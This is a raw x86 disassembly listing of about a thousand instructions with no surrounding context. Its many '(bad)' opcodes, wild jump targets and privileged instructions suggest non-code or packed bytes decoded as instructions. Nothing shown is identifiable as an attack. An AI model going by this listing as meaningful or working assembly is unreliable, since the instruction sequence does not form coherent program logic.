  40f995:	adc    DWORD PTR [edx-0x78],ebp
  40f998:	inc    esi
  40f999:	test   al,dh
  40f99b:	inc    edi
  40f99c:	fscale 
  40f99e:	push   eax
  40f99f:	xor    DWORD PTR ds:0x1666eb86,ebp
  40f9a5:	ror    BYTE PTR [edi+0x0],1
  40f9a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9a9:	xor    al,0xdb
  40f9ab:	test   BYTE PTR [esi-0x3a],0x31
  40f9af:	(bad)  
  40f9b0:	mov    esp,0x2d74cfdf
  40f9b5:	mov    bh,0x54
  40f9b7:	or     bl,cl
  40f9b9:	scas   eax,DWORD PTR es:[edi]
  40f9ba:	int    0x74
  40f9bc:	dec    ecx
  40f9bd:	jecxz  0x40f9f0
  40f9bf:	inc    esp
  40f9c0:	mov    dl,0x9d
  40f9c2:	fcomi  st,st(6)
  40f9c4:	push   ds
  40f9c5:	aam    0x3
  40f9c7:	shrd   DWORD PTR [esi+0x2f310003],ebp,cl
  40f9ce:	xchg   ecx,eax
  40f9cf:	jmp    0x40f9cf
  40f9d1:	jnp    0x40f9a1
  40f9d3:	jmp    FWORD PTR [edi]
  40f9d5:	inc    DWORD PTR cs:[eax]
  40f9d8:	xor    DWORD PTR [edx-0x63fa7b3b],esi
  40f9de:	into   
  40f9df:	(bad)  
  40f9e0:	xor    DWORD PTR [edx+0x6c49bddd],esi
  40f9e6:	popa   
  40f9e7:	inc    ecx
  40f9e8:	xor    DWORD PTR ds:0x43caff89,edi
  40f9ee:	iret   
  40f9ef:	dec    edi
  40f9f0:	fnstenv [esi+0x2e]
  40f9f3:	add    BYTE PTR [ecx],dh
  40f9f5:	sub    eax,0xf37373c4
  40f9fa:	mov    bl,dl
  40f9fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9fd:	arpl   di,cx
  40f9ff:	add    BYTE PTR [ecx],dh
  40fa01:	dec    ebx
  40fa02:	mov    fs,WORD PTR [edi+0x79]
  40fa05:	rol    BYTE PTR [ebx+0x0],1
  40fa08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa09:	xor    eax,0x8e00fc04
  40fa0e:	add    esi,DWORD PTR [eax+ebp*8]
  40fa11:	int3   
  40fa12:	fwait
  40fa13:	add    al,BYTE PTR [eax]
  40fa15:	mov    ah,0xf2
  40fa17:	push   edi
  40fa18:	and    ebp,DWORD PTR [esi+0x9]
  40fa1b:	ins    BYTE PTR es:[edi],dx
  40fa1c:	mov    eax,0x21dc467
  40fa21:	xor    DWORD PTR [esi+edx*2-0x57d89ea4],esi
  40fa28:	add    esp,DWORD PTR [esi+ecx*4-0x3bb03018]
  40fa2f:	cwde   
  40fa30:	fld    TBYTE PTR [esp+eiz*2-0x364bfc17]
  40fa37:	fisttp QWORD PTR [eax+0x3e90993]
  40fa3d:	cdq    
  40fa3e:	or     eax,0x9631454a
  40fa43:	imul   eax,DWORD PTR [ebx],0x19
  40fa46:	(bad)  
  40fa47:	int    0x33
  40fa49:	or     DWORD PTR [edx],esi
  40fa4b:	dec    ecx
  40fa4c:	add    al,0x31
  40fa4e:	adc    BYTE PTR [ecx-0xc777fa9],ch
  40fa54:	jae    0x40fac1
  40fa56:	dec    edx
  40fa57:	jmp    0x67ce205f
  40fa5c:	add    esi,DWORD PTR [ecx]
  40fa5e:	or     DWORD PTR [esi-0x6a443168],ebx
  40fa64:	into   
  40fa65:	scas   eax,DWORD PTR es:[edi]
  40fa66:	lea    ecx,[eax-0x7a3c282a]
  40fa6c:	cwde   
  40fa6d:	fidivr DWORD PTR [ebx-0x48ff3183]
  40fa73:	lea    ecx,[esi+edx*8-0x77a43c41]
  40fa7a:	fidivr WORD PTR [ebx+0x2efece65]
  40fa80:	call   0xe9702bde
  40fa85:	pop    ecx
  40fa86:	xor    DWORD PTR [edi],ebp
  40fa88:	jmp    0x3de9a80d
  40fa8d:	into   
  40fa8e:	(bad)  
  40fa8f:	pop    eax
  40fa90:	ds clc 
  40fa92:	mov    dh,0x4f
  40fa94:	add    BYTE PTR [eax-0x4a3fefce],ch
  40fa9a:	out    dx,eax
  40fa9b:	ret    
  40fa9c:	je     0x40fa9b
  40fa9e:	jg     0x40fb1c
  40faa0:	xlat   BYTE PTR ds:[ebx]
  40faa1:	push   ss
  40faa2:	ja     0x40fa66
  40faa4:	(bad)  
  40faa5:	pop    esp
  40faa6:	mov    ?,WORD PTR [edx+0x3c670efe]
  40faac:	adc    BYTE PTR [esi],al
  40faae:	test   eax,0x74fef6d7
  40fab3:	stos   DWORD PTR es:[edi],eax
  40fab4:	maskmovq mm5,(bad)
  40fab5:	imul   DWORD PTR [edx+eax*8-0x2]
  40fab9:	xor    al,0x86
  40fabb:	mov    edx,0x310de6fe
  40fac0:	pop    esi
  40fac1:	jmp    0xd65da8f8
  40fac6:	xchg   BYTE PTR ds:0xbbf594ff,bl
  40facc:	inc    dh
  40face:	cld    
  40facf:	jge    0x40fabc
  40fad1:	mov    dh,0xf4
  40fad3:	ret    
  40fad4:	(bad)  
  40fad5:	cmp    al,0x0
  40fad7:	add    eax,0xdc95b4c4
  40fadc:	ret    
  40fadd:	(bad)  
  40fade:	xchg   ecx,eax
  40fadf:	xlat   BYTE PTR ds:[ebx]
  40fae0:	(bad)  
  40fae3:	hlt    
  40fae4:	jge    0x40fad1
  40fae6:	sahf   
  40fae7:	in     al,dx
  40fae8:	ret    
  40fae9:	out    0x9,eax
  40faeb:	add    al,0x9
  40faed:	add    BYTE PTR [eax+0x140016f3],dh
  40faf3:	dec    eax
  40faf4:	scas   al,BYTE PTR es:[edi]
  40faf5:	sub    BYTE PTR [ebp-0xb00a35b],0xb6
  40fafc:	stos   BYTE PTR es:[edi],al
  40fafd:	or     al,dh
  40faff:	xor    cl,BYTE PTR [ecx]
  40fb01:	or     ebp,DWORD PTR [ecx]
  40fb03:	dec    BYTE PTR [ebx]
  40fb05:	pop    esi
  40fb06:	and    BYTE PTR [ebx+0xe],dh
  40fb09:	add    BYTE PTR [eax],bh
  40fb0b:	lea    eax,[edi+0x419a00bf]
  40fb11:	iret   
  40fb12:	(bad)  
  40fb13:	int    0xe2
  40fb15:	dec    esi
  40fb16:	push   edx
  40fb17:	inc    edi
  40fb18:	pop    edx
  40fb19:	or     al,0xe8
  40fb1b:	and    DWORD PTR [edx-0x2],eax
  40fb1e:	inc    DWORD PTR [ebx+0x1c4d877f]
  40fb24:	loopne 0x40fb2e
  40fb26:	ss push edi
  40fb28:	pushf  
  40fb29:	inc    edx
  40fb2a:	sub    DWORD PTR [edi+eax*1+0x45],edx
  40fb2e:	aam    0x99
  40fb30:	mov    edi,esi
  40fb32:	adc    al,0xca
  40fb34:	(bad)  
  40fb35:	sub    esi,esi
  40fb37:	rcr    DWORD PTR [ecx-0x30],1
  40fb3a:	jmp    0x40fb3c
  40fb3c:	jo     0x40fb5a
  40fb3e:	movzx  ebx,BYTE PTR [ebx+eiz*1-0x14]
  40fb43:	push   eax
  40fb44:	or     BYTE PTR [ebp+0x63],0x41
  40fb48:	or     BYTE PTR [ebx+0x44],al
  40fb4b:	fcomp  DWORD PTR [eax-0x1b]
  40fb4e:	push   cs
  40fb4f:	pop    edi
  40fb50:	sbb    BYTE PTR [esi],al
  40fb52:	add    esp,0x14
  40fb55:	inc    ebx
  40fb56:	inc    esp
  40fb57:	fcomp  DWORD PTR [eax]
  40fb59:	aam    0x73
  40fb5b:	shl    al,1
  40fb5d:	outs   dx,DWORD PTR ds:[esi]
  40fb5e:	je     0x40fb5f
  40fb60:	xchg   edi,eax
  40fb61:	ds inc esp
  40fb63:	ror    BYTE PTR [esi],1
  40fb65:	mov    ah,bh
  40fb67:	adc    al,0x3a
  40fb69:	js     0x40fbea
  40fb6b:	gs pushf 
  40fb6d:	aam    0xfe
  40fb6f:	(bad)  
  40fb70:	fcom   st(4)
  40fb72:	jae    0x40fb48
  40fb74:	and    BYTE PTR [ebp+0x63],cl
  40fb77:	inc    ecx
  40fb78:	enter  0x4442,0xd8
  40fb7c:	sbb    ch,ah
  40fb7e:	ficomp WORD PTR [esi-0x68]
  40fb81:	add    eax,0x4294c483
  40fb86:	inc    esp
  40fb87:	fdiv   DWORD PTR [ecx]
  40fb89:	or     bl,0x74
  40fb8c:	add    DWORD PTR [edi-0x67],0x7a4a8e75
  40fb93:	inc    esp
  40fb94:	popa   
  40fb95:	xor    al,0x46
  40fb97:	int3   
  40fb98:	loope  0x40fb94
  40fb9a:	push   ebp
  40fb9b:	ror    BYTE PTR [ecx],1
  40fb9d:	ins    DWORD PTR es:[edi],dx
  40fb9e:	pop    edi
  40fb9f:	inc    ecx
  40fba0:	add    BYTE PTR [ecx],dh
  40fba2:	jmp    0x40fbb9
  40fba4:	mov    dh,0xf9
  40fba6:	jo     0x40fbaa
  40fba8:	call   0xff0ca051
  40fbad:	sub    dh,al
  40fbaf:	sti    
  40fbb0:	and    DWORD PTR [esi-0x47fffd51],0x6c
  40fbb7:	mov    edx,0x2ebbc82
  40fbbc:	shrd   DWORD PTR ds:0xa7310003,ebp,cl
  40fbc3:	push   eax
  40fbc4:	or     al,0x19
  40fbc6:	jmp    0x8171fbf4
  40fbcb:	jecxz  0x40fb4f
  40fbcd:	icebp  
  40fbce:	mov    ah,0x7b
  40fbd0:	inc    esp
  40fbd1:	rol    edi,0x50
  40fbd4:	or     al,0xb6
  40fbd6:	in     eax,0x8f
  40fbd8:	inc    BYTE PTR [esi+eiz*2+0x6ff1447a]
  40fbdf:	push   eax
  40fbe0:	enter  0xedbe,0xbf
  40fbe4:	(bad)  
  40fbe5:	ins    BYTE PTR es:[edi],dx
  40fbe6:	pop    esi
  40fbe7:	add    al,0x0
  40fbe9:	xor    DWORD PTR [edx-0x143ec37b],esi
  40fbef:	inc    esp
  40fbf0:	add    BYTE PTR [ecx],dh
  40fbf2:	mov    esi,0x4a6c8d32
  40fbf7:	xor    al,0x6a
  40fbf9:	xor    BYTE PTR [esp+eax*1],cl
  40fbfc:	push   0x31
  40fbfe:	pop    ebp
  40fbff:	inc    ecx
  40fc00:	mov    al,0x1
  40fc02:	or     ebx,edx
  40fc04:	add    eax,DWORD PTR [eax]
  40fc06:	mov    ah,0x46
  40fc08:	sub    DWORD PTR [esi+ebx*4],esi
  40fc0b:	push   ss
  40fc0c:	jns    0x40fc4d
  40fc0e:	lock or dl,ah
  40fc11:	ret    
  40fc12:	add    bh,bl
  40fc14:	imul   ecx,DWORD PTR [ecx-0x3b],0xb217b509
  40fc1b:	fld    DWORD PTR ds:[ebx]
  40fc1e:	std    
  40fc1f:	adc    BYTE PTR [edx+0x31],ah
  40fc22:	inc    ecx
  40fc23:	daa    
  40fc24:	cs push es
  40fc26:	or     DWORD PTR es:[esi],ebx
  40fc29:	push   ecx
  40fc2a:	sub    eax,eax
  40fc2c:	fwait
  40fc2d:	mov    edx,DWORD PTR [edi+0x36]
  40fc30:	dec    ebp
  40fc31:	retf   
  40fc32:	lds    ecx,FWORD PTR [ecx+edx*4]
  40fc35:	push   es
  40fc36:	xor    DWORD PTR [eax-0x425e23c2],esi
  40fc3c:	cmc    
  40fc3d:	retf   0x3637
  40fc40:	sub    eax,0xe95d1cdc
  40fc45:	add    esp,DWORD PTR [esi]
  40fc47:	ss mov cl,0xdb
  40fc4a:	sbb    al,0x3a
  40fc4c:	(bad)  
  40fc4d:	retf   0x3617
  40fc50:	mov    ecx,0xc63a04db
  40fc55:	retf   0xd264
  40fc58:	stos   BYTE PTR es:[edi],al
  40fc59:	idiv   esi
  40fc5b:	push   esp
  40fc5c:	(bad)  
  40fc5d:	xlat   BYTE PTR ds:[ebx]
  40fc5e:	mov    bl,0xc4
  40fc60:	mov    al,ds:0x38bd7578
  40fc65:	pop    esp
  40fc66:	inc    ebp
  40fc67:	sub    al,0x28
  40fc69:	add    al,0x0
  40fc6b:	dec    ebx
  40fc6c:	push   es
  40fc6d:	add    eax,DWORD PTR [ecx+ecx*2]
  40fc70:	or     eax,0xb131450a
  40fc75:	mov    ch,BYTE PTR [eax]
  40fc77:	xor    DWORD PTR [ecx],ecx
  40fc79:	fs ret 
  40fc7b:	das    
  40fc7c:	xchg   ecx,eax
  40fc7d:	jmp    FWORD PTR [eax+0x62000932]
  40fc83:	popa   
  40fc84:	mov    ebp,0x4529fb8a
  40fc89:	clc    
  40fc8a:	mov    ecx,0x56fc346b
  40fc8f:	pop    esp
  40fc90:	sbb    eax,0x878b2985
  40fc95:	popf   
  40fc96:	jmp    0xbcc405cd
  40fc9b:	push   0xffffffbf
  40fc9d:	or     eax,0xfec0066d
  40fca2:	jmp    0xea15411a
  40fca7:	xor    cl,BYTE PTR [ecx]
  40fca9:	add    BYTE PTR [esi],ah
  40fcab:	icebp  
  40fcac:	loopne 0x40fcad
  40fcae:	call   0xa50805e5
  40fcb3:	and    bh,0xff
  40fcb6:	call   0x2d85c4ed
  40fcbb:	xor    cl,BYTE PTR [ecx]
  40fcbd:	add    cl,ch
  40fcbf:	mov    bh,0x54
  40fcc1:	clc    
  40fcc2:	bound  esp,QWORD PTR [esi+ecx*4]
  40fcc5:	inc    esp
  40fcc6:	mov    ch,0x5d
  40fcc8:	mov    WORD PTR [ecx+edi*4+0x65],es
  40fccc:	xor    eax,DWORD PTR [ecx]
  40fcce:	(bad)  
  40fccf:	add    BYTE PTR [esi-0x3f],ah
  40fcd2:	(bad)  
  40fcd3:	cmp    ecx,DWORD PTR [ecx]
  40fcd5:	adc    al,0xc0
  40fcd7:	cmp    al,0x41
  40fcd9:	mov    bh,BYTE PTR [ebp+ebp*4+0x32]
  40fcdd:	xor    al,0x4e
  40fcdf:	push   0x6e
  40fce1:	aad    0xff
  40fce3:	xor    al,0x73
  40fce5:	xor    DWORD PTR [edx+ecx*1],edi
  40fce8:	jb     0x40fcf3
  40fcea:	call   DWORD PTR [ecx+eiz*4]
  40fced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcee:	out    dx,al
  40fcef:	xor    al,0x2d
  40fcf1:	or     DWORD PTR [ebx],ecx
  40fcf3:	test   eax,0x661361
  40fcf8:	xchg   edi,eax
  40fcf9:	add    eax,0xfe410000
  40fcfe:	(bad)  
  40fcff:	jmp    0x40fcc8
  40fd01:	leave  
  40fd02:	inc    ebx
  40fd03:	enter  0xa98,0x0
  40fd07:	add    BYTE PTR [edi],cl
  40fd09:	dec    esi
  40fd0a:	enter  0x85ff,0x6e
  40fd0e:	std    
  40fd0f:	jne    0x40fca1
  40fd11:	loop   0x40fcf7
  40fd13:	std    
  40fd14:	dec    edi
  40fd16:	std    
  40fd17:	jne    0x40fd3d
  40fd19:	fnstsw WORD PTR [eax]
  40fd1b:	pop    ebp
  40fd1c:	mov    BYTE PTR [edx],cl
  40fd1e:	cmp    DWORD PTR [ebp+0x20],0x5
  40fd22:	je     0x40fd2c
  40fd24:	pop    ds
  40fd25:	dec    esi
  40fd26:	fsubr  st,st(0)
  40fd28:	jl     0x40fd11
  40fd2a:	(bad)  
  40fd2b:	inc    DWORD PTR [ebx+0x41]
  40fd2e:	mov    dl,BYTE PTR [ebp+0x40]
  40fd31:	cmp    al,0x11
  40fd33:	inc    DWORD PTR [eax]
  40fd35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd36:	sar    ch,cl
  40fd38:	push   edx
  40fd39:	inc    eax
  40fd3a:	cmp    eax,0xb6c3fc54
  40fd3f:	std    
  40fd40:	jne    0x40fd7e
  40fd42:	rcl    DWORD PTR [eax+0x8],1
  40fd45:	push   ecx
  40fd46:	mov    DWORD PTR [edx],0xeb3c6500
  40fd4c:	adc    esp,0xffffffa9
  40fd4f:	push   esp
  40fd50:	cmp    DWORD PTR ds:0x18416185,0xa
  40fd57:	jne    0x40fd77
  40fd59:	xlat   BYTE PTR ds:[ebx]
  40fd5a:	mov    esi,0x549637e
  40fd5f:	add    DWORD PTR [eax],eax
  40fd61:	or     BYTE PTR [edx],cl
  40fd63:	mov    esi,0x4a7b84
  40fd68:	jmp    0x40fd41
  40fd6a:	daa    
  40fd6b:	shl    DWORD PTR [esi],0xca
  40fd6e:	test   ah,al
  40fd70:	add    dh,BYTE PTR [ecx]
  40fd72:	push   cs
  40fd73:	test   DWORD PTR ds:0x82d51531,edi
  40fd79:	add    al,0xe4
  40fd7b:	cmp    al,0x41
  40fd7d:	xor    DWORD PTR [eax-0x50457c09],esi
  40fd83:	add    al,BYTE PTR [eax]
  40fd85:	mov    dl,0x6c
  40fd87:	sub    cl,BYTE PTR [ebx-0x10]
  40fd8a:	scas   eax,DWORD PTR es:[edi]
  40fd8b:	add    cl,BYTE PTR [edi]
  40fd8d:	mov    ch,0x4d
  40fd8f:	add    eax,DWORD PTR [eax]
  40fd91:	xor    DWORD PTR [ebx],esi
  40fd93:	push   es
  40fd94:	nop
  40fd95:	cli    
  40fd96:	jo     0x40fd9a
  40fd98:	add    BYTE PTR [eax],al
  40fd9a:	ss sub al,0xe2
  40fd9d:	(bad)  
  40fd9e:	jle    0x40fd4f
  40fda0:	mov    edi,0x2af7544
  40fda5:	add    BYTE PTR [ecx],dh
  40fda7:	out    0x3d,eax
  40fda9:	clc    
  40fdaa:	xor    DWORD PTR [eax+0x64ac0002],esi
  40fdb0:	(bad)  
  40fdb1:	dec    edi
  40fdb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdb3:	ins    BYTE PTR es:[edi],dx
  40fdb4:	retf   0xdb4f
  40fdb7:	scas   eax,DWORD PTR es:[edi]
  40fdb8:	pop    edx
  40fdb9:	into   
  40fdba:	shl    BYTE PTR [eax+0x2],cl
  40fdbd:	jmp    DWORD PTR [eax+ebp*2]
  40fdc0:	cmp    eax,DWORD PTR [ecx+0x31]
  40fdc3:	stos   DWORD PTR es:[edi],eax
  40fdc4:	ret    0xb50e
  40fdc7:	hlt    
  40fdc8:	add    al,BYTE PTR [eax]
  40fdca:	xor    DWORD PTR [edi],ebp
  40fdcc:	dec    ecx
  40fdcd:	clc    
  40fdce:	xor    DWORD PTR [ebx-0x4dce5482],ebp
  40fdd4:	add    al,BYTE PTR [ebx+0xf03ce8c]
  40fdda:	lods   eax,DWORD PTR ds:[esi]
  40fddb:	nop
  40fddc:	add    eax,DWORD PTR [eax]
  40fdde:	xor    DWORD PTR [edi],esi
  40fde0:	push   ecx
  40fde1:	cld    
  40fde2:	or     BYTE PTR [ecx],dh
  40fde4:	add    al,0x0
  40fde6:	xor    DWORD PTR [ebx+edi*2],edx
  40fde9:	xor    eax,0xec1f09e6
  40fdee:	scas   eax,DWORD PTR es:[edi]
  40fdef:	inc    esi
  40fdf0:	cdq    
  40fdf1:	(bad)  
  40fdf2:	pop    esp
  40fdf3:	sbb    eax,0x31c54166
  40fdf8:	arpl   WORD PTR gs:[eax+0x9],si
  40fdfc:	xchg   ecx,eax
  40fdfd:	in     eax,dx
  40fdfe:	add    BYTE PTR [edx+0x9],bl
  40fe01:	jmp    0xa8c9d4ba
  40fe06:	add    bh,BYTE PTR [eax-0x52a376ba]
  40fe0c:	sub    BYTE PTR [eax+0x4546ae03],ch
  40fe12:	mov    edi,0x3e8aced
  40fe17:	xor    DWORD PTR [ecx],ecx
  40fe19:	pop    esp
  40fe1a:	inc    ecx
  40fe1b:	cdq    
  40fe1c:	pop    ecx
  40fe1d:	rol    DWORD PTR [ebx+ecx*1],cl
  40fe20:	or     ebx,edx
  40fe22:	add    esp,DWORD PTR [esi+eax*2+0x8db3449]
  40fe29:	pop    esp
  40fe2a:	inc    ecx
  40fe2b:	popa   
  40fe2c:	pop    ecx
  40fe2d:	es icebp 
  40fe2f:	scas   al,BYTE PTR es:[edi]
  40fe30:	push   eax
  40fe31:	test   al,0x3
  40fe33:	sub    cl,cl
  40fe35:	pushf  
  40fe36:	sbb    BYTE PTR [edx-0x42fc02c2],dh
  40fe3c:	jecxz  0x40fe7e
  40fe3e:	add    eax,0xfae90931
  40fe43:	jbe    0x40fe7a
  40fe45:	ffreep st(6)
  40fe47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe48:	adc    esi,ebp
  40fe4a:	push   eax
  40fe4b:	sbb    DWORD PTR [ebx+ebx*2-0xecce028],edi
  40fe52:	pop    ebx
  40fe53:	sub    eax,0x1685c609
  40fe58:	jbe    0x40fe2c
  40fe5a:	mov    BYTE PTR [edi],0xbc
  40fe5d:	cmp    ebx,eax
  40fe5f:	push   ss
  40fe60:	loop   0x40fe84
  40fe62:	add    al,0x0
  40fe64:	xor    DWORD PTR [ebx+0x0],ebx
  40fe67:	mov    dh,0x29
  40fe69:	rol    DWORD PTR [edx+0x7c86e6a7],0xa1
  40fe70:	xor    dh,BYTE PTR ds:0x92c6a09
  40fe76:	(bad)  
  40fe78:	addr16 mov esp,0x34ef8efe
  40fe7e:	cld    
  40fe7f:	xchg   cl,al
  40fe81:	pop    edi
  40fe82:	dec    ebx
  40fe83:	sub    BYTE PTR ds:0xaeabc95b,ch
  40fe89:	mov    ebx,0x867e6253
  40fe8e:	ret    
  40fe8f:	popa   
  40fe90:	clc    
  40fe91:	or     BYTE PTR [edx+0xe],ch
  40fe94:	outs   dx,BYTE PTR ds:[esi]
  40fe95:	xor    al,0x8
  40fe97:	inc    ecx
  40fe98:	arpl   WORD PTR [edi],bp
  40fe9a:	dec    DWORD PTR [esi+0x5]
  40fe9d:	inc    ebp
  40fe9e:	cld    
  40fe9f:	push   0x29
  40fea1:	jno    0x40feed
  40fea3:	test   al,0x32
  40fea5:	or     DWORD PTR [esi+esi*8-0x51],esi
  40fea9:	inc    esp
  40feaa:	clc    
  40feab:	jmp    0xd24107e2
  40feb0:	jb     0x40fefd
  40feb2:	push   eax
  40feb3:	mov    ecx,0xbbf854d9
  40feb8:	ja     0x40fece
  40feba:	test   al,0xa2
  40febc:	in     eax,dx
  40febd:	or     BYTE PTR [ebp-0x14f912d7],al
  40fec3:	retf   0x3cb3
  40fec6:	clc    
  40fec7:	jmp    0xeb487fcc
  40fecc:	ror    BYTE PTR [edx+0x3529a298],cl
  40fed2:	mov    edx,0x35ece174
  40fed7:	or     cl,al
  40fed9:	pusha  
  40feda:	sar    dh,0xce
  40fedd:	mov    BYTE PTR [ebp-0x8],dl
  40fee0:	add    BYTE PTR [ebx-0xf8a0249],al
  40fee6:	les    edx,FWORD PTR [eax+0x8]
  40fee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feea:	dec    edx
  40feeb:	or     al,ch
  40feed:	pop    ds
  40feee:	ret    0xfffd
  40fef1:	xchg   edi,eax
  40fef2:	dec    edx
  40fef3:	or     al,ch
  40fef5:	jo     0x40feba
  40fef7:	std    
  40fef8:	jmp    DWORD PTR [edi+0x1dfffc4a]
  40fefe:	mov    ebp,0xc424d3e6
  40ff03:	std    
  40ff04:	leave  
  40ff05:	mov    cl,BYTE PTR [ecx]
  40ff07:	add    BYTE PTR [ebp+0x13],dl
  40ff0a:	loope  0x40fe8d
  40ff0c:	les    ebp,FWORD PTR [eax]
  40ff0e:	jmp    0x40ff66
  40ff10:	push   ebx
  40ff11:	and    ebp,edx
  40ff13:	or     eax,edi
  40ff15:	mov    al,BYTE PTR [esi]
  40ff17:	add    BYTE PTR [eax],al
  40ff19:	cwde   
  40ff1a:	lds    esi,FWORD PTR [ebx+0x8]
  40ff1d:	lock mov cl,0x58
  40ff20:	add    BYTE PTR [eax-0x40fe0977],cl
  40ff26:	mov    edi,0xe5c3c029
  40ff2b:	pop    ebp
  40ff2c:	leave  
  40ff2d:	add    BYTE PTR [edx],bl
  40ff2f:	mov    ebp,0x4040d0fe
  40ff34:	push   esp
  40ff35:	or     al,0xe1
  40ff37:	push   es
  40ff38:	mov    ebx,eax
  40ff3a:	push   edi
  40ff3b:	mov    al,bl
  40ff3d:	add    BYTE PTR [eax+0x6],bl
  40ff40:	mov    esi,DWORD PTR [ebp+0x40]
  40ff43:	inc    ecx
  40ff44:	jl     0x40ff4e
  40ff46:	and    ebp,edi
  40ff48:	mov    ebx,DWORD PTR gs:[esi]
  40ff4b:	xchg   dl,bh
  40ff4d:	xor    BYTE PTR [edx+0x51fc7ec0],ch
  40ff53:	dec    esp
  40ff54:	add    eax,0xeb15e480
  40ff59:	sbb    esi,DWORD PTR [ecx]
  40ff5b:	xor    bh,al
  40ff5d:	inc    eax
  40ff5e:	sbb    ebp,0xffffff82
  40ff61:	sti    
  40ff62:	ja     0x40ff5f
  40ff64:	sti    
  40ff65:	jg     0x40ff6c
  40ff67:	icebp  
  40ff68:	add    ebx,0x3b
  40ff6b:	(bad)  
  40ff6c:	stc    
  40ff6d:	sub    dh,cl
  40ff6f:	push   ss
  40ff70:	and    eax,0xfa6de85e
  40ff75:	call   FWORD PTR [edx]
  40ff77:	loopne 0x40ffc9
  40ff79:	or     BYTE PTR ds:0x15044bd9,cl
  40ff7f:	loopne 0x40ff58
  40ff81:	push   ss
  40ff82:	std    
  40ff83:	lock push ecx
  40ff85:	or     dh,ch
  40ff87:	loope  0x40ffd5
  40ff89:	push   es
  40ff8a:	pop    ebp
  40ff8b:	icebp  
  40ff8c:	dec    DWORD PTR [ecx]
  40ff8e:	call   0xc2fa:0xc017a8
  40ff95:	and    al,0xc9
  40ff97:	jae    0x40ff50
  40ff99:	add    al,al
  40ff9b:	xchg   ecx,eax
  40ff9c:	stos   DWORD PTR es:[edi],eax
  40ff9d:	clc    
  40ff9e:	ret    
  40ff9f:	(bad)  [esi+0x7f]
  40ffa2:	lds    esi,FWORD PTR [ebx]
  40ffa4:	mov    bh,0xa7
  40ffa6:	je     0x40ff7b
  40ffa8:	ss ds or al,0x6e
  40ffac:	mov    edi,0xea694473
  40ffb1:	dec    ebp
  40ffb2:	or     BYTE PTR [esi-0x13393994],ch
  40ffb8:	adc    eax,DWORD PTR [ebx]
  40ffba:	add    BYTE PTR [ecx],dh
  40ffbc:	mov    al,0x7f
  40ffbe:	cmp    al,0xa1
  40ffc0:	inc    cx
  40ffc2:	add    BYTE PTR [ecx],dh
  40ffc4:	cmp    al,0x2d
  40ffc6:	(bad)  
  40ffc7:	in     al,dx
  40ffc8:	mov    edi,0x8c306a31
  40ffcd:	add    ch,BYTE PTR [edx+0x31]
  40ffd0:	mov    WORD PTR [edx],es
  40ffd2:	push   0x31
  40ffd4:	or     DWORD PTR [ecx+ecx*2+0x19],esi
  40ffd8:	pop    edx
  40ffd9:	ficomp WORD PTR [ecx]
  40ffdb:	mov    eax,ds:0x3a042844
  40ffe0:	leave  
  40ffe1:	push   esp
  40ffe2:	(bad)  
  40ffe3:	mov    bl,0x36
  40ffe5:	mov    ebp,0x71fd7d04
  40ffea:	dec    ecx
  40ffeb:	cmp    eax,0x2bb42384
  40fff0:	add    DWORD PTR [esi],esi
  40fff2:	out    dx,al
  40fff3:	fiadd  DWORD PTR [ebx+ebx*1+0x36ab00b8]
  40fffa:	icebp  
  40fffb:	mov    ?,WORD PTR [ebp-0x47]
  40fffe:	mov    DWORD PTR [esi],eax
  410000:	ret    0x616d
  410003:	dec    ecx
  410004:	sub    eax,0xa7b3fbb8
  410009:	or     DWORD PTR [esi+0x39],edi
  41000c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41000d:	mov    eax,ds:0x9315cbc
  410012:	xor    DWORD PTR ds:0x5ee90931,eax
  410018:	not    BYTE PTR [esi+0x30]
  41001b:	(bad)  
  41001c:	or     DWORD PTR ss:[edx],eax
  41001f:	(bad)  
  410020:	jmp    0x410079
  410022:	scas   eax,DWORD PTR es:[edi]
  410023:	int3   
  410024:	jo     0x410027
  410026:	jmp    0x69e6aa83
  41002b:	enter  0x21ae,0xe9
  41002f:	jecxz  0x410097
  410031:	mov    eax,0xb7cf0240
  410036:	and    eax,0x90b4ed8d
  41003b:	add    edx,DWORD PTR [ecx]
  41003d:	or     ecx,ebp
  41003f:	stos   DWORD PTR es:[edi],eax
  410040:	add    DWORD PTR [edi],esp
  410042:	push   cs
  410043:	ret    
  410044:	test   eax,0x312c014e
  410049:	jmp    0xed5a0436
  41004e:	inc    DWORD PTR [esi-0x5b77490d]
  410054:	out    0x2f,al
  410056:	add    BYTE PTR [ecx],cl
  410058:	sub    eax,0xf6e809
  41005d:	inc    eax
  41005e:	mov    eax,0xb97960fe
  410063:	addr16 jmp 0xd23fb87b
  410069:	and    al,0x27
  41006b:	(bad)  
  41006c:	mov    esi,0x41ec4cbd
  410071:	sub    eax,0x8ae8ffe9
  410076:	mov    ah,0x6c
  410078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410079:	repz add BYTE PTR [ecx+edx*4+0x1a],0x9
  41007f:	and    cl,ch
  410081:	xor    ah,BYTE PTR [ecx-0x490c0311]
  410087:	mov    BYTE PTR [ecx+ecx*4],ch
  41008a:	mov    dh,0x74
  41008c:	fstp   DWORD PTR [edx+0x4]
  41008f:	sub    BYTE PTR fs:0xca6d74b8,ch
  410096:	xlat   BYTE PTR ds:[ebx]
  410097:	pop    eax
  410098:	jmp    0xee048ccf
  41009d:	jae    0x4100db
  41009f:	adc    cl,al
  4100a1:	push   eax
  4100a2:	sub    eax,0x3c73e941
  4100a7:	clc    
  4100a8:	push   ecx
  4100a9:	popa   
  4100aa:	push   eax
  4100ab:	add    cl,ch
  4100ad:	mov    bh,0xcb
  4100af:	or     esi,DWORD PTR [esi]
  4100b1:	sub    DWORD PTR [ecx],ebx
  4100b3:	push   0x4a16fa
  4100b8:	sbb    DWORD PTR es:[ebp+0x8ed63e7],edi
  4100bf:	add    BYTE PTR [edx+0x0],ch
  4100c2:	outs   dx,BYTE PTR ds:[esi]
  4100c3:	add    edi,edi
  4100c5:	xchg   esp,eax
  4100c6:	and    ah,BYTE PTR [ecx]
  4100c8:	push   edx
